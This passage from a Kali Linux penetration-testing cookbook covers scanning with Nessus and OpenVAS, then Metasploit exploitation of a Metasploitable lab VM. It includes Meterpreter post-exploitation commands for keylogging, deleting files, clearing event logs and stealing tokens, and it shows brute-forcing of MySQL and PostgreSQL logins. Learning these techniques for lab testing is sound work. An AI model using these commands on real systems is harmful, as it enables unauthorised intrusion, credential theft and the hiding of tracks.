     The vulnerabilities will be listed in detail

13\. Click onDownload Reportfrom theReports main menu.

109

![](images/00105.jpeg)

Vulnerability Assessment

Nessus - finding Windows-specific vulnerabilities

In this recipe, we will explore how to find Windows-specific vulnerabilities using Nessus.
These are vulnerabilities specific to the machines that run Windows on our network.

Getting ready

To complete this recipe, you will need a virtual machine(s) to test against:
                 Windows XP

    Windows 7

How to do it...

Let's begin the process of finding Windows-specific vulnerabilities with Nessus by opening the Mozilla Firefox web browser:

1.   Log in to Nessus athttp://127.0.0.1:8834.

2.   Go toPolicies.

3.   Click onAdd Policy.

110

![](images/00106.jpeg)

Chapter 5

4\. On theGeneral Settings tab, perform the following tasks:

1.   Enter a name for your scan. We choseWindows Vulnerability Scan,
             but you can choose any name you wish.

2.   Visibility has two options:

     Shared: Other users have the ability to utilize this scan     Private: This scan can only be utilized by you

3.   Take the defaults on the rest of the items on the page.

4.   Click onSubmit.

5\.               On thePluginstab, selectDisable All and enter the following specific vulnerabilities
 that are likely to be available on a Windows system:

     DNS

     Databases

     Denial of Service
     FTP

     SMTP Problems
     SNMP

     Settings

     Web Servers
     Windows

     Windows: Microsoft Bulletins
     Windows: User management

111

![](images/00107.jpeg)

Vulnerability Assessment

6.              Click onSubmit to save your new policy.

7.              On the main menu, click on theScans menu option.

8.              Click on theAdd Scan button and perform the following tasks:

1.   Enter a name for your scan. This is useful if you will be running more
 than one scan at a time. It's a way to differentiate the scans that are
 currently running.

2.   Enter the type of scan:

     Run Now: Enabled by default, this option will cause the scan
              to execute immediately

     Scheduled: Allows you to select the date and time when the scan
              should be executed

     Template: Allows you to set this scan as a template

3.   Choose a scan policy. In this case, theWindows Vulnerabilities Scan
             policy we created earlier in the recipe.

4.   Choose your targets considering the following points:
                  Targets must be entered one per line

     You can also enter ranges of targets on each line

     Upload a target's file (if you have one) or selectAdd Target IP Address

9.              Click onLaunch Scan:

112

![](images/00108.jpeg)

Chapter 5

10\. You will get a confirmation and your test will complete (depending on how many
 targets are selected and the number of tests performed).

11\. Once completed, you will receive a report.

12\. Double-click on the report to analyze the following points:

     Each target that a vulnerability is found for will be listed

     Double-click on the IP address to see the ports and issues on each port     Click on the number under the column to get the list of specific
              issues/vulnerabilities found

     The vulnerabilities will be listed in detail

13\. Click onDownload Reportfrom theReports main menu.

Installing, configuring, and starting OpenVAS

OpenVAS, theOpen Vulnerability Assessment System, is an excellent framework that can be used to assess the vulnerabilities of our target. It is a fork of the Nessus project. Unlike Nessus, OpenVAS offers its feeds completely free of charge. As OpenVAS comes standard in Kali Linux, we will begin with configuration.

Getting ready

A connection to the Internet is required to complete this recipe.

How to do it...

Let's begin the process of installing, configuring, and starting OpenVAS by navigating to its directory via a terminal window:

1.   OpenVAS is installed by default and it only needs to be configured in order
 to be utilized.

2.   From a terminal window, change your directory to the OpenVAS directory:

cd  /usr/share/openvas/

113

![](images/00109.jpeg)

Vulnerability Assessment

3.   Execute the following command:

openvas-mkcert

What we are performing in this step is creating the SSL certificate for the OpenVAS program:

1.   Leave the default lifetime of the CA certificate as it is.

2.   Update the certificate lifetime to match the number of days of the CA
 certificate:1460.

3.   Enter the country.

4.   Enter the state or province (if desired).

5.   Leave the organization name as the default.

6.   You will be presented with the certificate confirmation screen, then press
             Enter to exit:

4.   Execute the following command:

openvas-nvt-sync

This will sync the OpenVAS NVT database with the current NVT Feed. It will also update you with the latest vulnerability checks:

114

![](images/00110.jpeg)

Chapter 5

5.   Execute the following commands:

openvas-mkcert-client  -n om  -i openvasmd  -rebuild

This will generate a client certificate and rebuild the database respectively.

6.   Execute the following command:

openvassd

This will start the OpenVAS Scanner and load all plugins (approximately 26,406), so this may take some time.

7.   Execute the following commands:

openvasmd  --rebuild

openvasmd  --backup

These commands will rebuild and create a backup of the database.

8.   Execute the following command to create your administrative user
              (we useopenvasadmin):

openvasad  -c    'add_user'  -n openvasadmin  -r admin

9.   Execute the following command:

openvas-adduser

115

![](images/00111.jpeg)

Vulnerability Assessment

This will allow you to create a regular user:

1.   Enter a login name.

2.   PressEnter on the authentication request (this automatically chooses
 the password).

3.   Enter the password twice.

4.   For rules, pressCtrl+D.

5.   PressY to add the user.

10\. Execute the following commands to configure the ports that OpenVAS will
              interact with:

openvasmd  -p  9390  -a  127.0.0.1
openvasad  -a  127.0.0.1  -p  9393

gsad  --http-only  --listen=127.0.0.1  -p  9392

9392 is the recommended port for the web browser, but you can choose your own.

116

![](images/00112.jpeg)

Chapter 5

11\. Go tohttp://127.0.0.1:9392, in your browser to view the OpenVAS
              web interface.

How it works...

In this recipe, we began by opening a terminal window and installing OpenVAS via the

repository. We then created a certificate and installed our plugin database. Next, we created an administrative and a regular user account. Finally, we started the web interface of OpenVAS and were presented with the login screen.

Every time you perform an action with OpenVAS, you will need to rebuild the database.

117

![](images/00113.jpeg)

Vulnerability Assessment

There's more...

This section explains some additional information regarding starting OpenVAS.

Setting up an SSH script to start OpenVAS

Each time you would like to run OpenVAS, you need to:

1.   Sync the NVT Feed (always a good idea as these items will change as new
 vulnerabilities are discovered).

2.   Start the OpenVAS Scanner.

3.   Rebuild the database.

4.   Back up the database.

5.   Configure your ports.

To save a lot of time, the following is a simple Bash script that will allow you to start OpenVAS. Save this file asOpenVAS.shand place it in your/root folder:

#!/bin/bash

openvas-nvt-sync
openvassd

openvasmd  --rebuild
openvasmd  --backup

openvasmd  -p  9390  -a  127.0.0.1
openvasad  -a  127.0.0.1  -p  9393

gsad  --http-only  --listen=127.0.0.1  -p  9392

118

![](images/00114.jpeg)

Chapter 5

Using the OpenVAS Desktop

Optionally, you could perform the same steps via the OpenVAS Desktop. The OpenVAS Desktop is a GUI-based application. To start the application:

1.   Navigate toApplications|Kali Linux|Vulnerability Assessment|Vulnerability
 Scanners|OpenVAS|Start GreenBone Security Desktop from the Kali Linux
              desktopStart menu as shown in the following screenshot:

2.   Enter your server address as127.0.0.1.

3.   Enter your username.

4.   Enter your password.

5.   Click on theLog in button.

119

![](images/00115.jpeg)

Vulnerability Assessment

OpenVAS - finding local vulnerabilities

OpenVAS allows us to attack a wide range of vulnerabilities, and we will confine our list of
assessing the vulnerabilities of our target to those specific to the type of information we
seek to gain from the assessment. In this recipe, we will use OpenVAS to scan for local
vulnerabilities on our target. These are vulnerabilities specific to our local machine.

How to do it...

Let's begin the process of finding local vulnerabilities with OpenVAS by opening the Mozilla Firefox web browser:

1.   Go tohttp://127.0.0.1:9392 and log in to OpenVAS.

2.   Go toConfiguration|Scan Configs:

3.   Enter the name of the scan. For this recipe, we will useLocal Vulnerabilities.

4.   For the base, select theEmpty, static and fast option. This option allows us to start
 from scratch and create our own configuration.

5.   Click onCreate Scan Config:

120

![](images/00116.jpeg)

Chapter 5

6.   We now want to edit our scan config. Click on the wrench icon next toLocal
 Vulnerabilities:

7.   PressCtrl+Fand typeLocal in the find bar.

8.   For each local family found, put a check mark in theSelect all NVT's box. A family is a
 group of vulnerabilities. The chosen vulnerabilities are:

     Compliance

     Credentials

     Default Accounts
     Denial of Service
     FTP

     Ubuntu Local Security Checks

9.   Click onSave Config.

121

![](images/00117.jpeg)

Vulnerability Assessment

10\. Now go toConfiguration|Targets:

11\. Create a new target and perform the following tasks:

1.   Enter the name of the target.

2.   Enter the hosts using one of the following ways:

     Enter only one address:192.168.0.10

     Enter multiple e-mail addresses separated by a comma:
             192.168.0.10,192.168.0.115

     Enter a range of addresses:192.168.0.1-20

12\. Click onCreate Target.

13\. Now selectScan Management|New Task, and perform the following tasks:

1.   Enter the name of the task.

2.   Enter a comment (optional).

3.   Select your scan configuration. In this caseLocal Vulnerabilities.

4.   Select the scan targets. In this caseLocal Network.

5.   Leave all other options at their default levels.

6.   Click onCreate Task.

122

![](images/00118.jpeg)

Chapter 5

14\. Now go toScan Management|Tasks.

15\. Click on the play button next to our scan. In this caseLocal Vulnerability Scan:

How it works...

In this recipe, we launched OpenVAS and logged into its web-based interface. We then

configured OpenVAS to search for a set of local vulnerabilities. Finally, we selected our target and completed the scan. OpenVAS then scanned the target system against the list of known vulnerabilities included in our NVT Feed.

123

![](images/00119.jpeg)

Vulnerability Assessment

There's more...

Once your scan has been performed, you can see the results by viewing the report:

1.   Go toScan Management|Tasks.

2.   Click on the purple magnifying glass next toLocal Vulnerabilities Scan:

3.   Click on the download arrow to view the report:

124

![](images/00120.jpeg)

Chapter 5

OpenVAS - finding network vulnerabilities

In this recipe, we will use OpenVAS to scan for network vulnerabilities. These are vulnerabilities specific to devices on our targeted network.

Getting ready

To complete this recipe, you will need a virtual machine(s) to test against:
                 Windows XP

    Windows 7

    Metasploitable 2.0

    Any other flavor of Linux

How to do it...

Let's begin the process of finding network vulnerabilities with OpenVAS by opening the Mozilla Firefox web browser:

1.   Go tohttp://127.0.0.1:9392 and log in to OpenVAS.

2.   Go toConfiguration|Scan Configs:

3.   Enter the name of the scan. For this recipe, we will useNetwork Vulnerabilities.

4.   For the base, select theEmpty, static and fast option. This option allows us to start
 from scratch and create our own configuration.

125

![](images/00121.jpeg)

Vulnerability Assessment

5.   Click onCreate Scan Config:

6.              We now want to edit our scan config. Click on the wrench icon next

toNetwork Vulnerabilities.

7.              PressCtrl+Fand typeNetwork in the find bar.

8.              For each family found, put a check mark in theSelect all NVT's box.

A family is a group of vulnerabilities. The chosen vulnerabilities are:

             Brute force attacks

             Buffer overflow

             CISCO

             Compliance

             Credentials

             Databases

             Default Accounts

             Denial of Service

             FTP

             Finger abuses

             Firewalls

             Gain a shell remotely

             General

             Malware

             Netware

             NMAP NSE

             Peer-To-Peer File Sharing

             Port Scanners

             Privilege Escalation

             Product Detection

             RPC

             Remote File Access

126

![](images/00122.jpeg)

Chapter 5

     SMTP Problems
     SNMP

     Service detection
     Settings

     Wireless services

9.   Click onSave Config.

10\. Now go toConfiguration|Targets:

127

![](images/00123.jpeg)

Vulnerability Assessment

11\. Create a new target and perform the following tasks:

1.   Enter the name of the target.

2.   Enter the hosts using one of the following ways:
                  Enter only one address:192.168.0.10

     Enter multiple e-mail addresses separated by a comma:
             192.168.0.10,192.168.0.115

     Enter a range of addresses:192.168.0.1-20

12\. Click onSave Target.

13\. Now go toScan Management|New Task and perform the following tasks:

1.   Enter the name of the task.

2.   Enter a comment (optional).

3.   Select your scan configuration. In this caseNetwork Vulnerabilities.

4.   Select the scan targets. In this caseLocal Network.

5.   Leave all other options at their default levels.

6.   Click onCreate Task:

14\. Now go toScan Management|Tasks.

15\. Click on the play button next to our scan. In this caseNetwork Vulnerability Scan.

128

![](images/00124.jpeg)

Chapter 5

How it works...

In this recipe, we launched OpenVAS and logged into its web-based interface. We then

configured OpenVAS to search for a set of network vulnerabilities. Finally, we selected our target and completed the scan. OpenVAS then scanned the target system against the list of known vulnerabilities included in our NVT Feed.

There's more...

Once your scan has been performed, you can see the results by viewing the report:

1.   Go toScan Management|Tasks.

2.   Click on the purple magnifying glass next toNetwork Vulnerabilities Scan

3.   Click on thedownload arrow to view the report:

129

![](images/00125.jpeg)

Vulnerability Assessment

OpenVAS - finding Linux-specific vulnerabilities

In this recipe, we will use OpenVAS to scan for Linux vulnerabilities. These are vulnerabilities specific to Linux machines operating on our targeted network.

Getting ready

To complete this recipe, you will need a virtual machine(s) to test against:
                 Metasploitable 2.0

    Any other flavor of Linux

How to do it...

Let's begin the process of finding Linux-specific vulnerabilities with OpenVAS by opening the Mozilla Firefox web browser:

1.   Go tohttp://127.0.0.1:9392 and log in to OpenVAS.

2.   Go toConfiguration|Scan Configs:

3.   Enter the name of the scan. For this recipe, we will useLinux Vulnerabilities.

4.   For the base, select theEmpty, static and fast option. This option allows us to start
 from scratch and create our own configuration.

130

![](images/00126.jpeg)

Chapter 5

5.   Click onCreate Scan Config:

6.              We now want to edit our scan config. Click on the wrench icon next to

Linux Vulnerabilities.

7.              PressCtrl+Fand typeLinux in the find bar.

8. For each local family found, put a check mark in theSelect all NVT's box.

The chosen vulnerabilities are:

     Brute force attacks
     Buffer overflow
     Compliance
     Credentials
     Databases

     Default Accounts
     Denial of Service
     FTP

     Finger abuses

     Gain a shell remotely
     General

     Malware

     Netware

     NMAP NSE

     Port Scanners

     Privilege Escalation
     Product Detection

131

![](images/00127.jpeg)

Vulnerability Assessment

     RPC

     Remote File Access
     SMTP Problems
     SNMP

     Service detection
     Settings

     Wireless services
     Web Servers

9.   Click onSave Config.

10\. Now go toConfiguration|Targets:

11\. Create a new target and perform the following tasks:

1.   Enter the name of the target.

2.   Enter the hosts using one of the following ways:

     Enter only one address:192.168.0.10

     Enter multiple e-mail addresses separated by a comma:
             192.168.0.10,192.168.0.115

     Enter a range of addresses:192.168.0.1-20

12\. Click onSave Target.

132

![](images/00128.jpeg)

Chapter 5

13\. Now go toScan Management|New Task and perform the following tasks:

1.   Enter the name of the task.

2.   Enter a comment (optional).

3.   Select your scan configuration. In this caseLinux Vulnerabilities.

4.   Select the scan targets. In this caseLocal Network.

5.   Leave all other options at their default levels.

6.   Click onCreate Task:

14\. Now go toScan Management|Tasks.

15\. Click on the play button next to our scan. In this caseLinux Vulnerability Scan.

How it works...

In this recipe, we launched OpenVAS and logged into its web-based interface. We then

configured OpenVAS to search for a set of Linux vulnerabilities. Finally, we selected our target and completed the scan. OpenVAS then scanned the target system against the list of known vulnerabilities included in our NVT Feed.

There's more...

Once your scan has been performed, you can see the results by viewing the report:

1.   Go toScan Management|Tasks.

2.   Click on the purple magnifying glass next toLinux Vulnerabilities Scan.

133

![](images/00129.jpeg)

Vulnerability Assessment

3.   Click on the download arrow to view the report:

OpenVAS - finding Windows-specific vulnerabilities

In this recipe, we will use OpenVAS to scan for Windows vulnerabilities. These are
vulnerabilities specific to Windows machines operating on our targeted network.

Getting ready

To complete this recipe, you will need a virtual machine(s) to test against:
                 Windows XP

    Windows 7

134

![](images/00130.jpeg)

Chapter 5

How to do it...

Let's begin the process of finding Windows-specific vulnerabilities with OpenVAS by opening the Mozilla Firefox web browser:

1.   Go tohttp://127.0.0.1:9392 and log in to OpenVAS.

2.   Go toConfiguration|Scan Configs:

3.   Enter the name of the scan. For this recipe, we will useWindows
              Vulnerabilities.

4.   For the base, select theEmpty, static and fast option.

5.   Click onCreate Scan Config:

6.   We now want to edit our scan config. Press the wrench icon next to

Windows Vulnerabilities.

7.   For each family found, put a check mark in theSelect all NVT's box.
 The chosen vulnerabilities are:

     Brute force attacks
     Buffer overflow
     Compliance
     Credentials
     Databases

135

![](images/00131.jpeg)

Vulnerability Assessment

     Default Accounts
     Denial of Service
     FTP

     Gain a shell remotely
     General

     Malware

     NMAP NSE

     Port Scanners

     Privilege Escalation
     Product Detection
     RPC

     Remote File Access
     SMTP Problems
     SNMP

     Service detection
     Web Servers
     Windows

     Windows: Microsoft Bulletins

136

![](images/00132.jpeg)

Chapter 5

8.   Click onSave Config.

9.   Now go toConfiguration|Targets:

10\. Create a new target and perform the following tasks:

1.   Enter the name of the target.

2.   Enter the hosts using one of the following ways:

     Enter only one address: 192.168.0.10

     Enter multiple e-mail addresses separated by a,
 192.168.0.10,192.168.0.115

     Enter a range of addresses: 192.168.0.1-20

11\. Click onSave Target.

12\. Now go toScan Management|New Task, and perform the following tasks:

1.   Enter the name of the task.

2.   Enter a comment (optional).

3.   Select your scan configuration. In this caseWindows Vulnerabilities.

4.   Select the scan targets. In this caseLocal Network.

5.   Leave all other options at their default levels.

137

![](images/00133.jpeg)

Vulnerability Assessment

6.   Click onCreate Task:

13\. Now go toScan Management|Tasks.

14\. Click on the play button next to our scan. In this caseWindows Vulnerability Scan.

How it works...

In this recipe, we launched OpenVAS and logged into its web-based interface. We then

configured OpenVAS to search for a set of Windows vulnerabilities. Finally, we selected our target and completed the scan. OpenVAS then scanned the target system against the list of known vulnerabilities included in our NVT Feed.

138

![](images/00134.jpeg)

Chapter 5

There's more...

Once your scan has been performed, you can see the results by viewing the report:

1.   Go toScan Management | Tasks.

2.   Click on the purple magnifying glass next toWindows Vulnerabilities Scan.

3.   Click on the download arrow to view the report:

139

![](images/00004.jpeg)

6

Exploiting

Vulnerabilities

In this chapter, we will cover:

    Installing and configuring Metasploitable

    Mastering Armitage, the graphical management tool for Metasploit    Mastering the Metasploit Console (MSFCONSOLE)
    Mastering the Metasploit CLI (MSFCLI)
    Mastering Meterpreter

    Metasploitable MySQL

    Metasploitable PostgreSQL
    Metasploitable Tomcat
    Metasploitable PDF

    Implementing browser_autopwn

Introduction

Once we have completed our vulnerability scanning steps, we now have the knowledge necessary to attempt to launch exploits against our target system(s). In this chapter,
we will examine using various tools including the Swiss Army knife of testing systems, which is Metasploit. ![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00135.jpeg)

Exploiting Vulnerabilities

Installing and configuring Metasploitable

In this recipe, we will install, configure, and start Metasploitable 2\. Metasploitable is a

Linux-based operating system that is vulnerable to various Metasploit attacks. It was designed by Rapid7, the owners of the Metasploit framework. Metasploitable is an excellent way to get familiar with using Meterpreter.

Getting ready

To execute this recipe we will need the following:
                 A connection to the Internet

    Available space on your VirtualBox PC

    An unzipping tool (in this case we are using 7-Zip on a Windows machine)

How to do it...

Let's begin the recipe by downloading Metasploitable 2\. Getting the package from SourceForge is going to be our safest option:

1.   Download Metasploitable 2 from the following link:http://sourceforge.net/
 projects/metasploitable/files/Metasploitable2/.

2.   Save the file to a location on your hard drive.

3.   Unzip the file.

4.   Place the contents of the folder in a location where you store your virtual disk files.

5.   Open VirtualBox and click on theNew button:

142

![](images/00136.jpeg)

Chapter 6

6.   Click onNext.

7.   Enter a name of Metasploitable 2 while selecting anOperating System:ofLinux
             andVersion:ofUbuntu, and click onNext as shown in the following screenshot:

143

![](images/00137.jpeg)

Exploiting Vulnerabilities

8.   Select512 MBof RAM if you have it available and click onNext:

9.   Choose an existing disk and select the VDMK file from where you downloaded it
 and saved the Metasploitable 2 folder:

144

![](images/00138.jpeg)

Chapter 6

10\. Your virtual disk window will look as it does in the following screenshot. In this

instance, we do not need to update the disK space at all. This is because when using
Metasploitable, you are attacking the system, not using it as an operating system.

11\. Click onCreate:

12\. Start Metasploitable 2 by clicking on its name and clicking on theStart button.

145

![](images/00139.jpeg)

Exploiting Vulnerabilities

How it works...

In this recipe, we set up Metasploitable 2 on Virtualbox. We began the recipe by downloading Metasploitable fromSourceforge.net. Next, we configured the VDMK to run inside of Virtualbox and concluded by starting the system.

Mastering Armitage, the graphical
management tool for Metasploit

The newer versions of Metasploit utilize a graphical front end tool called Armitage.

Understanding of Armitage is important because it ultimately makes your usage of Metasploit easier by providing information to you visually. It encompasses the Metasploit Console and, by using its tabbing capabilities, allows you to see more than one Metasploit Console or
Meterpreter session at a time.

Getting ready

A connection to the Internet or internal network is required to complete this recipe.

How to do it...

Let's begin our review of Armitage:

1.   From the desktop go toStart|Kali Linux|Exploitation Tools|Network
 Exploitation Tools|Armitage:

146

![](images/00140.jpeg)

Chapter 6

2.   On the Armitage login screen, click on theConnect button:

147

![](images/00141.jpeg)

Exploiting Vulnerabilities

3.   It may take Armitage a while to connect to Metasploit. While this takes place,

you may see the following notification window. Do not be alarmed. It will go away
once Armitage is able to connect. On theStart Metaspoit?screen, click onYes:

4.   You are then presented with the Armitage main screen. We will now discuss

the following three regions on the main screen (marked asA.,B., andC. in the following screenshot):

 A: This region displays the preconfigured modules. You can search for
 modules using the space provided below the modules list.

 B: This region displays your active targets that we are able to run our
 exploits against.

 C: This region displays multiple Metasploit tabs allowing for multiple

Meterpreter or console sessions to be run and displayed simultaneously.

148

![](images/00142.jpeg)

Chapter 6

An alternative way to launch Armitage is to type the following command into a terminal window:

armitage

See also

    To learn more about Meterpreter, please see theMastering Meterpreter section

Mastering the Metasploit Console (MSFCONSOLE)

In this recipe, we will examine theMetasploit Console(MSFCONSOLE). The MSFCONSOLE is primarily used to manage the Metasploit database, manage sessions, and configure and launch Metasploit modules. Essentially, for the purposes of exploitation, the MSFCONSOLE will get you connected to a host so that you can launch your exploits against it.

Some common commands you will use when interacting with the console are:

    help: This command will allow you to view the help file for the command you are
 trying to run

    use module: This command allows you to begin configuring the module that you
 have chosen

    set optionname module: This command allows you to set the various options
 for a given module

    exploit: This command launches the exploit module
    run: This command launches a non-exploit module

    search module: This command allows you to search for an individual module    exit: This command allows you to exit the MSFCONSOLE

Getting ready

A connection to the Internet or internal network is required to complete this recipe.

149

![](images/00143.jpeg)

Exploiting Vulnerabilities

How to do it...

Let's begin our exploration of the MSFCONSOLE:

1.   Open a command prompt.

2.   Launch the MSFCONSOLE by using the following command:

msfconsole

3.   Search for all the available Linux modules by using thesearch command. It is

always a good idea to search for our module each time we want to perform an action. The major reason for this is that between various versions of Metasploit, the path to the module may have changed:

search linux

4.   Use the John the Ripper Linux Password Cracker module:

use auxiliary/analyzse/jtr_linux

150

![](images/00144.jpeg)

Chapter 6

5.   Show the available options of the module by using the following command:

show options

6.   Now that we have a listing of options that we can run for this module, we can set
              individual options by using thesetcommand. Let's set theJOHN_PATH option:

set JOHN_PATH  /usr/share/metasploit-framework/data/john/wordlists/ password.lst

7.   Now to run our exploit we type in theexploit command:
             exploit

There's more...

Once you have gained access to your host using the MSFCONSOLE, you must use Meterpreter in order to distribute your payloads. MSFCONSOLE manages your sessions, but Meterpreter does your actual payload and exploit engagements.

Mastering the Metasploit CLI (MSFCLI)

In this recipe, we will explore theMetasploit CLI(MSFCLI). Metasploit requires the use of an interface in order to perform its tasks. The MSFCLI is such an interface. It is a good interface for learning Metasploit or testing/writing a new exploit. It also serves well in the case of using scripts and applying basic automation to tasks.

One major issue with using the MSFCLI is that you can only open one shell at a time. You will also notice that as we are exploring some of our commands it functions a bit slower and is a little more complicated than the MSFCONSOLE. Finally, you have to know the exact exploit that you would like to run in order to use the MSFCLI. This can make it a little difficult for new penetration testers who are not familiar with the Metasploit list of exploits.

151

![](images/00145.jpeg)

Exploiting Vulnerabilities

Some commands for MSFCLI are:

    msfcli: This loads a list of all available exploits accessible to MSFCLI    msfcli  -h: Displays the MSFCLI help file

    msfcli  [PATH TO EXPLOIT]  [options  = value]: This is the syntax
              for launching an exploit

Getting ready

A connection to the Internet or internal network is required to complete this recipe.

How to do it...

Let's begin our exploration of the Metasploit CLI:

1.   Start the Metasploit CLI (MSFCLI) using the following command. Please be patient
 as this may take a little bit of time depending on the speed of your system. Also note
 that as the MSFCLI loads, a list of available exploits will display.

msfcli

2.   Display the MSFCLI help file:

msfcli  -h

152

![](images/00146.jpeg)

Chapter 6

3.   For our demonstration, we will perform a Christmas Tree Scan. We will choose option
 A to display the modules advanced options:

msfcli auxiliary/scanner/portscan/xmas A

For more information on the Christmas Tree Scan, please review the following URL:

http://en.wikipedia.org/wiki/Christmas_tree_packet

153

![](images/00147.jpeg)

Exploiting Vulnerabilities

4.   Additionally you can list a summary of the current module by using theS mode.

The summary mode is a great way to see all of the options available to you for the
exploit that you are trying to run. Many of the options are optional but, usually, a few
are required which allows you to set the target or the port you are trying to launch the exploit against.

msfcli auxiliary/scanner/portscan/xmas S

5.   To show a list of options available for this exploit, we use theO mode. Options are
 a way to configure the exploit module. Each exploit module has a different set of
              options (or none at all). All required options must be set before the exploit is allowed
              to execute. From the following screenshot, you will notice that many of the required
              options are set by default. If this is the case, you do not have to update the options
 value unless you want to change it.

msfcli auxiliary/scanner/portscan/xmas O

154

![](images/00148.jpeg)

Chapter 6

6.   To execute our exploit, we use theE mode:

msfcli auxiliary/scanner/portscan/xmas E

In the case of this exploit, we used the default options.

How it works...

In this recipe, we began by launching the MSFCLI, searched for a module to use, then

proceeded to execute the module. During our searching phase, we chose the Christmas

Tree Scan module and reviewed the MSFCLI interface for viewing a summary of the module and its available options. After all options were set, we ran the exploit.

It's important to know that the Metasploit framework is divided into three distinct parts. Those parts are:

    Vulnerabilities: These are weaknesses, both known and unknown, that are contained
 against a particular application, software package, or protocol. In Metasploit,
              vulnerabilities are listed as groups with various exploits to attack the vulnerability
 listed under them.

    Exploits: Exploits are modules that are set up to be able to take advantage of the
 vulnerabilities found.

    Payloads: Once an exploit has successfully run, a payload must be delivered to the
 attacked machine in order to allow us to create shells, run various commands, add
 users, and so on.

155

![](images/00149.jpeg)

Exploiting Vulnerabilities

Once you have gained access to your host using the MSFCLI or MSCONSOLE you must

use Meterpreter in order to deliver your payloads. MSFCONSOLE manages your sessions, but Meterpreter does your actual payload and exploit engagements. We will explore
Meterpreter in the next recipe.

See also

    To learn more about Meterpreter, please see theMastering Meterpreter section

Mastering Meterpreter

Once you have gained access to your host using either Armitage, MSFCLI, or MSFCONSOLE,
you must use Meterpreter in order to deliver your payloads. MSFCONSOLE is used to manage
your sessions, while Meterpreter does your actual payload and exploit engagements.

Some common commands used with Meterpreter include:

    help: This command will allow you to view the help file.

    background: This command allows you to keep a Meterpreter session running in the
              background. The command will take you back to an MSF (Metasploit) prompt.

    download: This command allows you to download a file from your victims machine.    upload: This command allows you to upload a file to your victim's machine.
    execute: This command allows you to run a command on your victim's machine.    shell: This command allows you to run a Windows shell prompt on your victim's
 machine (for Windows hosts only).

    session  -i: This command allows you to switch between sessions.

Getting ready

The following requirement needs to be fulfilled:
                 A connection to the intranet or Internet

    An active session to a target system created by Metasploit using either Armitage,
 MSFCLI, or MSFCONSOLE

156

![](images/00150.jpeg)

Chapter 6

How to do it...

Let's begin by opening the MSFCONSOLE:

1. First we begin with an active session being displayed from the MSFCONSOLE.

2.              Start logging keystrokes typed in by users of the exploited system:

keyscan_start

3. Dump the keystrokes typed in by users of the exploited system. The keystrokes will

display onscreen:

keyscan_dump

4\. Stop logging keystrokes typed in by users of the exploited system:

keyscan_stop

5\. Delete a file on the exploited system:

del exploited.docx

6\. Clear event logs on the exploited system:

clearav

7.              Show a list of the running processes:

ps

8.              Kill a given process on the exploited system using the syntax of kill[pid]:

kill  6353

9.              Attempt to steal an impersonation token from our exploited system:

steal_token

How it works...

We began this recipe from an already established Meterpreter session by using either Armitage, the MSFCONSOLE, or the MSFCLI. Later, we ran various commands on the targeted machine.

There's more...

When we use Meterpreter against a Linux-based host, we are able to run Linux commands against our target just as we would if we were operating the machine.

157

![](images/00151.jpeg)

Exploiting Vulnerabilities

Metasploitable MySQL

In this recipe, we will explore how to use Metasploit to attack a MySQL database server

using the MySQL Scanner module. Being the database of choice for many website platforms, including Drupal and Wordpress, many websites are currently using the MySQL database server. This makes it an easy target for the Metasploitable MySQL attack!

Getting ready

The following requirement needs to be fulfilled:

    A connection to the internal network

    Metasploitable running in our hacking lab
    Wordlist to perform dictionary attack

How to do it...

Let's begin our MySQL attack by opening a terminal window:

1.   Open a terminal window.

2.   Launch the MSFCONSOLE:

msfconsole

3.   Search for all the available MySQL modules:

search mysql

158

![](images/00152.jpeg)

Chapter 6

4.   Use the MySQL Scanner module:

use auxiliary/scanner/mysql/mysql_login

5.   Show the available options of the module:

show options

6.   SetRHOST to the host of your Metasploitable 2 machine or target:
             set RHOST  192.168.10.111

7.   Set your username file location. This is a user file list of your choice:

set user_file  /root/Desktop/usernames.txt

8.   Set your password file location. This is a password file list of your choice:

set pass_file  /root/Desktop/passwords.txt

159

![](images/00153.jpeg)

Exploiting Vulnerabilities

9.   Run the exploit:

Exploit

10\. Metasploit goes out and tries to enter a combination of all usernames and passwords
 contained in both files. Locate the+ sign next to the login and password combination
 that works.

How it works...

In this recipe, we used Metasploit's MSFCONSOLE to exploit a MySQL vulnerability on our

target Metasploitable 2 host. We began by launching the console and searching for all known
MySQL vulnerabilities. After choosing the MySQL login exploit, which allows us to brute force
the MySQL login, we set our options and executed the exploit. Using the username and
password files supplied by the exploit, Metasploit tries to brute force the MySQL database.

There's more...

In this recipe, we used a custom generated username and password file. There are many ways to generate the username wordlist and the password file and several methods are provided inChapter 8,Password Attacks.

Metasploitable PostgreSQL

In this recipe, we will explore how to use Metasploit to attack a PostgreSQL database server
using the PostgreSQL Scanner module. PostgreSQL is touted as being the world's most
advanced open source database and by many enthusiasts is said to be an enterprise
class database. We will use Metasploit in order to brute force a PostgreSQL login.

160

![](images/00154.jpeg)

Chapter 6

Getting ready

The following requirement needs to be fulfilled:

    A connection to the internal network

    Metasploitable running in our hacking lab
    Wordlist to perform dictionary attack

How to do it...

Let's begin our PostgreSQL attack by opening a terminal window:

1.   Open the command prompt.

2.   Launch the MSFCONSOLE:

msfconsole

3.   Search for all the available PostgreSQL modules:

search postgresql

161

![](images/00155.jpeg)

Exploiting Vulnerabilities

4.   Use the PostgreSQL Scanner module:

use auxiliary/scanner/postgres/postgres_login

5.   Show the available options of the module:

show options

6.   SetRHOST to the host of your Metasploitable 2 machine or target:
             set RHOST  192.168.10.111

7.   Set your username file location. This is a user file list of your choice, however, the
              user file location is provided as it's included by Metasploit:

set user_file  /usr/share/metasploit-framework/data/wordlists/ postgres_default_user.txt

8.   Set your password file location. This is a password file list of your choice, however,
 the password file location is provided as it's included by Metasploit:

set pass_file  /usr/share/metasploit-framework/data/wordlists/ postgres_default_user.txt

9.   Run the exploit:

exploit

162

![](images/00156.jpeg)

Chapter 6

How it works...

In this recipe, we used Metasploit's MSFCONSOLE to exploit a PostgreSQL vulnerability on our target Metasploitable 2 host. We began by launching the console and searching for all known PostgreSQL vulnerabilities. After choosing the PostgreSQL login exploit, which allows us to brute force the PostgreSQL login, we set our options and executed the exploit. Metasploit goes out and tries to enter a combination of all usernames and passwords contained in both files. Locate the+ sign next to the login and password combination that works.

There's more...

In this recipe, we used a default PostgreSQL wordlist for the usernames and passwords.
Likewise, we could also have created our own. There are many ways to generate the
username wordlist and the password file and several methods are provided inChapter 8,Password Attacks.

Metasploitable Tomcat

In this recipe, we will explore how to use Metasploit to attack a Tomcat server using the
Tomcat Manager Login module. Tomcat, or Apache Tomcat, is an open source web server
and servlet container used to run Java Servlets and Java Server Pages (JSP). The Tomcat
server is written in pure Java. We will use Metasploit in order to brute force a Tomcat login.

